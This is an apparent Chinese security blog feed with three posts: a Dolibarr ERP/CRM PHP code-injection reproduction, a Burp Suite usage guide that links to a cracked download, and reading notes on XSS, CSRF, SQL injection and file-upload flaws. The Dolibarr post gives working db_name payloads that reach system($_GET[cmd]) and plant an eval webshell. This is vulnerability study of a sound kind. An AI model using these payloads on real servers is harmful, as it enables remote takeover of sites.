class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[XDebug]</span><br><span class="line"></span><br><span class="line">;性能分析文件的存放位置，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;函数调用跟踪信息输出文件目录，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.trace_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.auto_trace=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数参数，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_params=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数返回值，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_return=1</span><br><span class="line"></span><br><span class="line">;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.profiler_enable = 1</span><br><span class="line"></span><br><span class="line">;性能分析文件的命名规则，默认值为cachegrind.out.%p</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line"></span><br><span class="line">;用于zend studio远程调试的应用层通信协议</span><br><span class="line"></span><br><span class="line">xdebug.remote_handler = &quot;dbgp&quot;</span><br><span class="line"></span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line"></span><br><span class="line">xdebug.remote_host = &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_port = 9000</span><br></pre></td></tr></table></figure><p><strong>3.打开Phpstorm，需要打开或者新创一个项目，这里我们打开Phpstudy的根目录作为项目。在PhpStudy软件的解压目录下的www文件夹就是我们的网站根目录。</strong></p><p><img src="\images\pasted-20.png" alt="upload successful"></p><p>open -&gt;选择相应目录的WWW文件，点OK，再点OK 完成项目的创建。</p><p><img src="\images\pasted-21.png" alt="upload successful"></p><p><strong>4.选择PHP的版本信息。</strong> </p><p><img src="\images\pasted-22.png" alt="upload successful"><br>Debug端口设置 </p><p><img src="\images\pasted-23.png" alt="upload successful"><br>IDEKEY： </p><p><img src="\images\pasted-24.png" alt="upload successful"><br>配置PHP Web Application </p><p><img src="\images\pasted-25.png" alt="upload successful"><br>查看配置： </p><p><img src="\images\pasted-26.png" alt="upload successful"><br>debug配置完成了</p><p><strong>3.实现截取操作</strong></p><p>在火狐或是谷歌浏览器中下载插件Xdebug helper，图标为一只吃虫子的标志。点击Debug启动Xdebug helper。</p><p><img src="\images\pasted-27.png" alt="upload successful"><br>在Pphstorm中写好一个php文件，并开启如下的选项，左上角的电话图标。 </p><p><img src="\images\pasted-28.png" alt="upload successful"><br>选择一个浏览器打开写好的文件 </p><p><img src="\images\pasted-29.png" alt="upload successful"><br>截取到了内容，或者你点击网页的刷新，会在phpstrom中打开相应的php文件，也说明截取到了 </p><p><img src="\images\pasted-30.png" alt="upload successful"></p><h4 id="Dolibarr-ERP-CRM-php代码注入漏洞"><a href="#Dolibarr-ERP-CRM-php代码注入漏洞" class="headerlink" title="Dolibarr ERP/CRM php代码注入漏洞"></a>Dolibarr ERP/CRM php代码注入漏洞</h4><p><strong>Dolibarr ERP &amp; CRM是一个用于管理的组织的活动(联系人、供应商、发票、订单、股票、议程…)。它是一个用PHP语言编写的开源软件，支持mysql,mssql,pgsql。专为小型、中型或大型公司、基金会和自由职业者设计。</strong></p><p><strong>1、先配置好Dolibarr环境。</strong></p><p>将Dolibarr的压缩包解压到PhpStudy的WWW的目录下。</p><p><img src="\images\pasted-31.png" alt="upload successful"><br>然后打开Phpstuduy，点击其他选项菜单-&gt;Phpstudy设置-&gt;端口常规设置，在网站目录中选择dolibarr目录中的hedocs文件，然后点击应用。 </p><p><img src="\images\pasted-32.png" alt="upload successful"><br>打开浏览器输入127.0.0.1/install </p><p><img src="\images\pasted-33.png" alt="upload successful"><br>然后点击开始进行dolibarr的安装。账户密码均为root，然后一直下一步，直至安装完毕。 </p><p><img src="\images\pasted-34.png" alt="upload successful"><br>安装完毕后，会在Phpstrom中自动截取到step1.php的文件。 </p><p><img src="\images\pasted-35.png" alt="upload successful"><br><strong>2、开始代码的修改。</strong></p><p>step1.php文件第55行接受了我们传递的db_name参数并执行了GETPOST方法</p><p><img src="\images\pasted-36.png" alt="upload successful"><br>按F7跟进GETPOST，在functions.lib.php第512行，GETPOST方法根据接收的check值进行不同的操作，此处接收的check值为alpha。我们看到在switch的alpha代码块中，对db_name的值进行了双引号和../的过滤。 </p><p><img src="\images\pasted-37.png" alt="upload successful"></p><p>ALT+SHIFT=F7跳回step1.php,在接收了全部参数，并确定没有错误的情况下。在文件517行对配置文件进行了备份并调用write_conf_file方法将参数写入配置文件。 </p><p><img src="\images\pasted-38.png" alt="upload successful"><br>继续跟进528行write_conf_file,函数首先定义了所需要的全局变量来获取参数值，并把配置写入/conf/conf.php文件。</p><p><img src="\images\pasted-39.png" alt="upload successful"><br>继续往下走，直接定位到写入数据库名称的代码段 </p><p><img src="\images\pasted-40.png" alt="upload successful"><br>提交时前台会有js检测，用burp来截断修改我们的参数值，注意在提交时要勾选创建数据库复选框，否则配置文件写入不成功。<br>数据库名称改为dolibarr \’;phpinfo();//<br><img src="\images\pasted-41.png" alt="upload successful"><br>配置文件也进行了正常写入，但是虽然已经正常写入了代码，如果直接访问配置文件被阻止 </p><p><img src="\images\pasted-42.png" alt="upload successful"><br>通过包含此文件的文件去间接的执行代码</p><p><img src="\images\pasted-43.png" alt="upload successful"><br>更改payload，执行系统命令并getshell </p><p><img src="\images\pasted-44.png" alt="upload successful"><br>将db_name改为dolibarr \’;system($_GET[cmd]);// </p><p><img src="\images\pasted-45.png" alt="upload successful"><br>访问/insex.php?cmd={command} </p><p><img src="\images\pasted-46.png" alt="upload successful"><br>修改命令为echo “&lt;?php @eval($_POST[topsec])?&gt;”&gt; 网站绝对路径/shell.php </p><p><img src="\images\pasted-47.png" alt="upload successful"></p><p>请求后会在网站根目录下生成一句话木马，尝试用菜刀连接</p><p><img src="\images\pasted-48.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite神器指北</title>
    <link href="http://yoursite.com/2018/08/07/burpsuite%E7%A5%9E%E5%99%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/07/burpsuite神器指北/</id>
    <published>2018-08-07T15:44:29.000Z</published>
    <updated>2018-08-13T09:17:52.190Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="burpsuite简介"><a href="#burpsuite简介" class="headerlink" title="burpsuite简介"></a>burpsuite简介</h1><p>BurpSuite是居家日站必备工具，基本上所有的测试人员都会使用的工具，具有多种强大的功能。最主要的作用就是抓包，其余的模块都是为了起一个辅助作用。还可以加入各种其他模块方便测试。 </p><p>Burp Suite是进行Web应用安全测试集成平台。它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞 。 在安全人员常用工具表（<a href="http://sectools.org/" target="_blank" rel="noopener">http://sectools.org/</a>）中，burpsuite排在第13位，且排名在不断上升，由此可见它在安全人员手中的重要性。  </p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>BurpSuite是一个Java应用程序，并分发作为一个独立的.jar扩展的Java可执行文件。</p><h4 id="1-JDK配置"><a href="#1-JDK配置" class="headerlink" title="1.JDK配置"></a>1.JDK配置</h4><p> <a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">http://</a><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">www.oracle.com/technetwork/java/javase/downloads/index.html</a></p><p>启动Burp，检查是否安装了java环境：</p><p>打开一个命令提示：</p><p>  在window环境下，点击开始&gt;&gt;运行&gt;&gt;输入cmd回撤</p><p>  在mac osx环境下，在terminal控制端中</p><p>  在linux环境下，在console或者shell中</p><p>在window cmd窗口中输入：<code>java –version</code></p><p>  如果安装了java环境，你将会看到一个像：java version “1.6.0_21”的版本信息，运行burpsuite至少需要java版本1.6以上。</p><p>如果安装好java环境之后并且成功配置完，只需要双击jar可执行文件即可，或者在命令行中输入：<code>java –jar –Xmx1024m /path/to/burp.jar</code>,如果提示内存不足可以通过-Xmx参数设置，更多参数设置在后面输入–help。 </p><h4 id="2-BurpSuite下载与安装"><a href="#2-BurpSuite下载与安装" class="headerlink" title="2.BurpSuite下载与安装"></a>2.BurpSuite下载与安装</h4><p><a href="https://www.52pojie.cn/thread-691448-1-1.html" target="_blank" rel="noopener">https://</a><a href="https://www.52pojie.cn/thread-691448-1-1.html" target="_blank" rel="noopener">www.52pojie.cn/thread-691448-1-1.html</a></p><p>JDK版本在1.8.0_112之上，应该都不会有问题。破解的话按帖子来就可以</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>  配置代理<br> 浏览器导入证书，这样可以拦截所有流量。在代理开启的情况下，访问<a href="http://burp,下载证书" target="_blank" rel="noopener">http://burp,下载证书</a></p><p> 然后将证书导入浏览器</p><h5 id="IE浏览器的代理设置"><a href="#IE浏览器的代理设置" class="headerlink" title="IE浏览器的代理设置"></a>IE浏览器的代理设置</h5><ol><li>选择“连接选项卡” </li><li>选择“局域网设置”   </li><li>在“为LAN使用代理服务器”前打勾   </li><li>地址输入<code>127.0.0.1</code> 端口输入<code>8080</code>（注：在BurpSuite中默认为8080端口，其他端口请修改BurpSuite配置）  </li></ol><h5 id="谷歌浏览器的代理设置"><a href="#谷歌浏览器的代理设置" class="headerlink" title="谷歌浏览器的代理设置"></a>谷歌浏览器的代理设置</h5><p>这里以Google Chrome 54.0.2840.87 m为例，其他版本设置类似。 谷歌浏览器的设置类似于IE浏览器，在谷歌浏览器地址栏输入<code>chrome://settings/</code>打开设置，下拉找到“更改代理服务器设置”，将弹出Internet属性窗口，然后参考IE浏览器的设置方法即可 </p><h5 id="火狐浏览器的代理设置"><a href="#火狐浏览器的代理设置" class="headerlink" title="火狐浏览器的代理设置"></a>火狐浏览器的代理设置</h5><p>在火狐浏览器右上角打开菜单中选择<code>选项</code>依次选择“高级”-&gt;“网络”-&gt;“设置”-&gt;“手动配置代理”，然后HTTP代理设置为<code>127.0.0.1</code> 端口设置为 <code>8080</code>（注：在BurpSuite中默认为8080端口，其他端口请修改BurpSuite配置） </p><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>看一下burp的菜单，如果你想改变主界面的字体大小，进入User Options&gt;&gt;Display选项，然后在编辑User Interface的字体大小。</p><p>  其次，如果您想更改HTTP消息的字体大小，进入选项卡，然后去显示子选项卡，并编辑在HTTP报文显示部分的字体大小。如果想在收到的消息中显示中文，还有HTTP消息的解码格式也要设定。</p><p>最后重新启动</p><p>burp</p><p>并检查新字体是否是合适的</p><p><img src="\images\pasted-2.png" alt="upload successful"></p><h1 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h1><h4 id="主要模块："><a href="#主要模块：" class="headerlink" title="主要模块："></a>主要模块：</h4><ol><li>Target(目标)——显示目标目录结构的的一个功能       </li><li>Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。       </li><li>Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。       </li><li>Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。      </li><li>Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。       </li><li>Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。       </li><li>Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。      </li><li>Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。       </li><li>Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。      </li><li>Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。       </li><li>Options(设置)——对Burp Suite的一些设置      </li><li>Alerts(警告)——Burp Suite在运行过程中发生的一写错误 </li></ol><p><img src="\images\pasted-3.png" alt="upload successful"></p><h2 id="代理模块"><a href="#代理模块" class="headerlink" title="代理模块"></a>代理模块</h2><p>代理模块作为BurpSuite的核心功能，拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 </p><p>用于显示修改HTTP请求及响应内容，并可以将拦截的HTTP请求快速发送至其他模块处理。 </p><p><strong>Module 1：intercept</strong> </p><p><img src="\images\pasted-4.png" alt="upload successful"></p><p>Forward：用于发送数据。当把所需要的HTTP请求编辑编辑完成后，手动发送数据。</p><p>Drop：将该请求包丢弃。</p><p>Intercept is off/on:拦截开关。当处于off状态下时，BurpSuite会自动转发所拦截的所有请求；当处于on状态下时，BurpSuite会将所有拦截所有符合规则的请求并将它显示出来等待编辑或其他操作。</p><p>Action:功能菜单，与右键菜单内容相同，在这可以将请求包发送到其他的模块或者对数据包进行其他的操作，比如发送到爆破模块进行爆破，发送到repeter模块进行多次重放</p><p><strong>Module 2：http history</strong> </p><p><img src="\images\pasted-5.png" alt="upload successful"></p><p>将记录经过代理服务器访问的所有请求，即使当Intercept is off时也会记录 </p><p>双击某个请求即可打开详情,通过Previous/next可以快速切换请求，并且Action也可以将请求发送至其他模块 </p><p><strong>Module 3：WebSockets history</strong> </p><p>用于记录WebSockets的数据包，是HTML5中最强大的通信功能，定义了一个全双工的通信信道，只需Web上的一个 Socket即可进行通信，能减少不必要的网络流量并降低网络延迟。 </p><p><strong>Module 4：Options</strong> </p><p>主要用于设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等。 </p><p>代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听127.0.0.1地址，端口8080。 </p><h6 id="选项1：Proxy-Listeners"><a href="#选项1：Proxy-Listeners" class="headerlink" title="选项1：Proxy Listeners"></a><strong>选项1：Proxy Listeners</strong></h6><p><img src="\images\pasted-6.png" alt="upload successful"><br>add：添加一个新的代理地址 </p><p>edit：编辑选中的代理地址 </p><p>remove：删除选中代理地址 </p><h6 id="选项2：Intercept-Client-Requests"><a href="#选项2：Intercept-Client-Requests" class="headerlink" title="选项2：Intercept Client Requests"></a><strong>选项2：Intercept Client Requests</strong></h6><p><img src="\images\pasted-7.png" alt="upload successful"></p><p>配置拦截规则，设置拦截的匹配规则 </p><h6 id="选项3：Intercept-Server-Responses"><a href="#选项3：Intercept-Server-Responses" class="headerlink" title="选项3：Intercept Server Responses"></a><strong>选项3：Intercept Server Responses</strong></h6><p><img src="\images\pasted-8.png" alt="upload successful"></p><p>配置拦截规则，设置拦截的匹配规则，不过这个选项是基于服务端拦截，当选小的Intercept request based on the following rules为选中状态时，burpsuite会匹配响应包。 </p><h2 id="Intruder模块（暴力破解）"><a href="#Intruder模块（暴力破解）" class="headerlink" title="Intruder模块（暴力破解）"></a>Intruder模块（暴力破解）</h2><p>Burp intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击。它可以用来自动执行您的测试过程中可能出现的所有类型的任务。例如目录爆破，注入，密码爆破等。 </p><h3 id="Module-1：Target"><a href="#Module-1：Target" class="headerlink" title="Module 1：Target"></a><strong>Module 1：Target</strong></h3><p>用于配置目标服务器进行攻击的详细信息 </p><p><img src="\images\pasted-9.png" alt="upload successful"></p><p>Host：这是目标服务器的IP地址或主机名。</p><p>Port：这是目标服务的端口号。</p><p>Use HTTPS：这指定的SSL是否应该被使用</p><p>在BurpSuite任何请求处，右键菜单选择“Send to intruder”选项，将自动发送到此模块下并自动填充</p><h3 id="Module-2：Positions"><a href="#Module-2：Positions" class="headerlink" title="Module 2：Positions"></a><strong>Module 2：Positions</strong></h3><p>设置Payloads的插入点以及攻击类型（攻击模式） </p><p><img src="\images\pasted-10.png" alt="upload successful"></p><ul><li>sniper：对变量依次进行破解。多个标记依次进行。</li><li>battering ram：对变量同时进行破解。多个标记同时进行。</li><li>pitchfork：每一个变量标记对应一个字典，取每个字典的对应项。</li><li>cluster bomb：每个变量对应一个字典，并且进行交集破解，尝试各种组合。适用于用户名+密码的破解。</li></ul><p><img src="\images\pasted-11.png" alt="upload successful"><br>add：插入一个新的标记</p><p>clear：清除所有的标记</p><p>auto：自动设置标记，一个请求发到该模块后burpsuite会自动标记cookie URL等参数</p><p>refresh：如果必要的话，这可以要求模板编辑器的语法高亮</p><h3 id="Module-3：Payloads"><a href="#Module-3：Payloads" class="headerlink" title="Module 3：Payloads"></a><strong>Module 3：Payloads</strong></h3><p><img src="\images\pasted-12.png" alt="upload successful"><br>设置payload，配置字典 </p><p>Payload Set：指定需要配置的变量</p><ul><li>这里只介绍部分常用Payload，其他Payload可自行研究。</li><li>Simple list:简单字典</li><li>Runtime file:运行文件</li><li>Custom iterator:自定义迭代器</li><li>Character substitution:字符替换</li><li>Recursive grep:递归查找</li><li>lllegal unicode:非法字符</li><li>Character blocks:字符块</li><li>Numbers:数字组合</li><li>Dates:日期组合</li><li>Brute forcer:暴力破解</li><li>Null payloads:空payload</li><li>Username generator：用户名生成</li><li>copy other payload：复制其他payload</li></ul><p><strong>选项2：Payload Opetions[Payload type]</strong> </p><p>该选项会根据选项1中Payload type的设置而改变</p><p><img src="\images\pasted-13.png" alt="upload successful"></p><p><strong>选项3：Payload Processing</strong> </p><p><img src="\images\pasted-14.png" alt="upload successful"></p><p>对生成的Payload进行编码、加密、截取等操作 </p><p><strong>选项4：Payload Encoding</strong> </p><p>你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输 </p><h3 id="Module-4：Options"><a href="#Module-4：Options" class="headerlink" title="Module 4：Options"></a>Module 4：Options</h3><p><strong>选项1：Request Headers</strong> </p><p><img src="\images\pasted-15.png" alt="upload successful"></p><p>控制在Intruder是否更新配置请求头 </p><p><strong>选项2：Request Engine</strong> </p><p><img src="\images\pasted-16.png" alt="upload successful"></p><p>设置发送请求的线程、超时重试等 </p><p>Number of threads：线程，该选项控制攻击请求的并发数。 </p><p>Number of retries on network failure：网络故障的重试次数 - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。 </p><p><strong>选项3：Attack Results</strong> </p><p>设置攻击结果的显示。 </p><p><strong>选项4：Grep - Match</strong> </p><p>在响应中找出存在指定的内容的一项</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>白帽子讲web安全—-读书笔记</title>
    <link href="http://yoursite.com/2018/08/07/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E5%85%A8%E2%80%94-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/08/07/白帽子讲web安全全—-读书笔记/</id>
    <published>2018-08-07T15:44:29.000Z</published>
    <updated>2018-08-13T15:07:57.936Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="对安全的理解"><a href="#对安全的理解" class="headerlink" title="对安全的理解"></a>对安全的理解</h1><p>安全工程师的核心竞争力不在于拥有多少个0day，掌握多少种安全技术，而在于对安全的理解深度，以及看待安全问题的角度和高度</p><h1 id="安全问题的本质是信任的问题"><a href="#安全问题的本质是信任的问题" class="headerlink" title="安全问题的本质是信任的问题"></a>安全问题的本质是信任的问题</h1><p>对条件的信任程度，是确定对象是否安全的基础</p><p>设计安全方案时，根据其发生的可能性，需要有不同的侧重点</p><h1 id="互联网安全的核心问题，是数据安全的问题"><a href="#互联网安全的核心问题，是数据安全的问题" class="headerlink" title="互联网安全的核心问题，是数据安全的问题"></a>互联网安全的核心问题，是数据安全的问题</h1><h1 id="安全三要素"><a href="#安全三要素" class="headerlink" title="安全三要素"></a>安全三要素</h1><p>CIA:      机密性      完整性     可用性</p><p>机密性要求数据内容不能泄露，可用加密实现</p><p>完整性即保护的数据内容是完整的、没有被篡改的，可通过数字签名实现</p><p>可用性要求保护资源是“随需而得”</p><h1 id="安全评估流程"><a href="#安全评估流程" class="headerlink" title="安全评估流程"></a>安全评估流程</h1><p>资产等级划分  –&gt;威胁分析  –&gt;风险分析  –&gt; 确定解决方案</p><h1 id="安全思想"><a href="#安全思想" class="headerlink" title="安全思想"></a>安全思想</h1><p>没有绝对的安全</p><p>安全没有银弹，安全是一个持续的过程</p><p>最大的漏洞是人</p><p>安全应该是产品的一种属性</p><h1 id="白帽子兵法"><a href="#白帽子兵法" class="headerlink" title="白帽子兵法"></a>白帽子兵法</h1><p>secure  by default：白名单和黑名单、最小权限原则 </p><p>纵深防御原则：不同层面的安全方案，构成整个防御体系；在正确的地方做正确的事情</p><p>数据与代码分离原则:从本质上解决“注入”引起的问题</p><p>不可预测性原则：具有一定的随机性，可有效对抗基于篡改、伪造的攻击</p><h1 id="客户端脚本安全"><a href="#客户端脚本安全" class="headerlink" title="客户端脚本安全"></a>客户端脚本安全</h1><h3 id="1-浏览器安全"><a href="#1-浏览器安全" class="headerlink" title="1.浏览器安全"></a>1.浏览器安全</h3><p>同源策略：浏览器最基本最核心的安全功能</p><p>同源策略限制了来自不同源的document或脚本，对当前document读取或设置属性</p><p>影响源的因素：host、子域名、端口、协议</p><p>第三方插件自身的同源策略</p><p>浏览器沙箱</p><p>恶意网址拦截</p><h3 id="2-跨站脚本攻击（XSS）"><a href="#2-跨站脚本攻击（XSS）" class="headerlink" title="2.跨站脚本攻击（XSS）"></a>2.跨站脚本攻击（XSS）</h3><p>第一种：反射型XSS                  简单的把用户数据反射给浏览器，需要用户点击</p><p>第二种：存储型XSS                  把用户输入的数据存储在服务器中</p><p>第三种：DOM Based XSS        通过修改DOM节点的反射型xss</p><p>XSSPayload：实际上是JavaScript脚本   </p><p>可以：    盗取cookie</p><p>​               XSS钓鱼</p><p>​               识别用户浏览器</p><p>​               获取用户真实IP</p><p>​               XSS  worm 蠕虫</p><p>远程Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&quot;img&quot;);</span><br><span class="line">img.src = &quot;http://blog.dyboy.cn/index.do?m=delete&amp;id=123&quot;;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure><p>类似还有表单，XMLHttpRequest</p><p><code>XSS Worm</code></p><p>CSS中 <code>background:url(&#39;javascript:alert(1)&#39;)</code></p><p><code>Flash XSS</code></p><h4 id="XSS防御：Httponly、浏览器filter"><a href="#XSS防御：Httponly、浏览器filter" class="headerlink" title="XSS防御：Httponly、浏览器filter"></a>XSS防御：Httponly、浏览器filter</h4><h3 id="3-跨站请求伪造（CSRF）"><a href="#3-跨站请求伪造（CSRF）" class="headerlink" title="3.跨站请求伪造（CSRF）"></a>3.跨站请求伪造（CSRF）</h3><p>攻击者借用用户的名义，向某一服务器发送恶意请求，对服务器来讲，这一请求是完全合法的，但攻击者确完成了一个恶意操作，比如以用户的名义发送邮件，盗取账号，购买商品等等 </p><p>原理：</p><p>#用户访问可信任站点A，并产生了相关的cookie; </p><p>#用户在访问A站点时没有退出，同时访问了危险站点B;</p><p>#网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；  </p><p>#浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，   向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求 </p><p>浏览器持有 <code>Third-party Cookie</code> 是本地Cookie(可设置时效，本地存储)，<code>Session Cookie</code>浏览器关闭即失效(内存中)</p><p>P3P ： 允许跨域访问隐私数据</p><h4 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h4><p>验证码、<code>Referer Check</code>，<code>Anit Csrf Token</code></p><p><code>Token</code>尽量位于表单，敏感操作改为<code>POST</code>提交，XSS做好防护，否则CSRF防御也是枉然</p><h3 id="4-点击劫持"><a href="#4-点击劫持" class="headerlink" title="4.点击劫持"></a>4.点击劫持</h3><p>攻击者通过使用一个不可见的iframe，覆盖在一个网页上，诱使用户在网页上操作，用户在不知情的情况下，恰好点击在攻击者设置好的iframe页面上的一些功能性按钮上</p><p>拖拽劫持 数据窃取  触屏劫持 </p><p>防御：</p><p><code>JavaScript</code>禁止<code>iframe</code>嵌套 HTTP头<code>X-Frame-Options</code></p><p><code>iframe</code> 可设置 <code>sandbox</code> 参数</p><h1 id="服务器端安全"><a href="#服务器端安全" class="headerlink" title="服务器端安全"></a>服务器端安全</h1><h3 id="5-SQL注入"><a href="#5-SQL注入" class="headerlink" title="5.SQL注入"></a>5.SQL注入</h3><p>注入攻击的本质，是把用户输入的数据当做代码执行，一是用户能控制输入，二是原本程序的代码，拼接了用户输入的数据</p><p>盲注 (<code>Blind Injection</code>) </p><p><code>Timing Attack</code> :mysql中 <code>BENCHMARK(count,expr)</code>函数 用于延时，当然还有<code>sleep()</code></p><p>​                             postgreSQL 中  PG_SLEEP(5)</p><p>​                              MS SQL  Server 中  WAITFOR  DELAY ‘0:0:5’   </p><p>命令注入：<code>UDF</code></p><p><code>xp_cmdshell</code> ：   在 <code>sysadmin</code> 权限下可开启<code>sp_configure</code>,<code>sp_addextendproc来</code>开启此功能</p><p><code>xp_regread</code> 操作注册表等等很多，在SQLMAP下已经集成</p><p>宽字节注入： </p><p>数据库使用GBK编码，转义符号\被吃掉   %df‘  or  1=1，为避免可统一设置为utf-8</p><h4 id="防御SQL注入："><a href="#防御SQL注入：" class="headerlink" title="防御SQL注入："></a>防御SQL注入：</h4><p>使用预编译语句，绑定变量</p><p>使用安全的存储过程</p><p>检查数据类型</p><p>使用安全函数</p><h3 id="6-XML注入"><a href="#6-XML注入" class="headerlink" title="6.XML注入"></a>6.XML注入</h3><p>代入数据，改变了xml结构 </p><h3 id="7-代码注入"><a href="#7-代码注入" class="headerlink" title="7.代码注入"></a>7.代码注入</h3><p>存在代码注入漏洞的地方，与后门没有区别，由不安全的函数或方法引起</p><p><code>eval()</code> <code>assert()</code> <code>system()</code> 等 </p><p>防御：禁用此类危险函数</p><h3 id="8-CRLF-注入"><a href="#8-CRLF-注入" class="headerlink" title="8.CRLF 注入"></a>8.CRLF 注入</h3><p>Carriage Return, Line Feed -&gt; <code>\r\n</code></p><p>使用CRLF的地方都可能存在此类型注入，如Log和HTTP头(<code>Http Response Spliting</code>)</p><h3 id="9-文件上传漏洞"><a href="#9-文件上传漏洞" class="headerlink" title="9.文件上传漏洞"></a>9.文件上传漏洞</h3><p>用户上传了一个可执行的脚本文件，并通过此脚本文件获得执行服务器端命令的能力</p><p>解析问题、脚本文件、文件包含</p><p>黑名单的检测方式，很不安全的检测方式</p><p>绕过：%00、伪造文件头</p><p><code>Apache</code>解析问题：文件名从后往前直到一个认识的文件类型为止</p><p><code>IIS</code>文件解析问题：截断字符 <code>;</code>，<code>/a.asp/</code>路径下所有类型文件当作<code>asp</code>解析，<code>PUT method</code>（上传），<code>MOVE method</code>（改名），<code>DELETE method</code>…</p><p>使用 <code>OPTIONS /HTTP/1.1</code> 探测服务器信息</p><p><code>PHP CGI</code> 路径解析问题：<code>test.jpg/.php</code>当作php脚本执行</p><p>利用上传文件钓鱼</p><h4 id="防御：-1"><a href="#防御：-1" class="headerlink" 